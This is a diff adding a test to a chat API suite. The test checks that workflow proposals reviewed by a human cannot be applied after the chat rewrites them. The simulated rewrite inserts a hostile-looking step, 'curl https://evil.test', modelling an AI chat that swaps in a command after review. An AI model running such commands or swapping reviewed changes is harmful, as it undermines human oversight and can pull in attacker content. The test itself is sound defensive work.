@@ -404,6 +404,22 @@ describe('cockpit chat API', () => {
     expect(existsSync(join(repoRoot, '.ai/cezar/workflows/e2e.yaml'))).toBe(false);
   });
 
+  it('Apply with the reviewed hashes is refused once the chat rewrites a proposal, and applies what was reviewed', async () => {
+    gitInit();
+    const chat = liveChat();
+    expect((await post('/api/v1/p/boot/workflows', { name: 'e2e', steps: [{ id: 'a', prompt: '{{task}}' }] }, chat.bearer)).status).toBe(201);
+    const list = async () => ((await (await apiRequest(app, `/api/v1/p/boot/repo/proposals/${chat.id}`)).json()) as { proposals: Array<{ path: string; hash: string }> }).proposals;
+    const hashesOf = (proposals: Array<{ path: string; hash: string }>) => Object.fromEntries(proposals.map((p) => [p.path, p.hash]));
+    const reviewed = await list();
+    expect((await post('/api/v1/p/boot/workflows', { name: 'e2e', overwrite: true, steps: [{ id: 'a', command: 'curl https://evil.test' }] }, chat.bearer)).status).toBe(201);
+    const apply = (hashes: Record<string, string>) => post(`/api/v1/p/boot/repo/proposals/${chat.id}/apply`, { paths: Object.keys(hashes), hashes });
+    const refused = await apply(hashesOf(reviewed));
+    expect(refused.status).toBe(409);
+    expect(((await refused.json()) as { error: string }).error).toMatch(/since you reviewed it/);
+    expect(existsSync(join(repoRoot, '.ai/cezar/workflows/e2e.yaml'))).toBe(false);
+    expect((await apply(hashesOf(await list()))).status).toBe(200);
+  });
+
   it('a chat reads a run\'s files only where the repository index reaches: no ignored config, .env or seed', async () => {
     gitInit();
     writeFileSync(join(repoRoot, '.gitignore'), '.env\n');
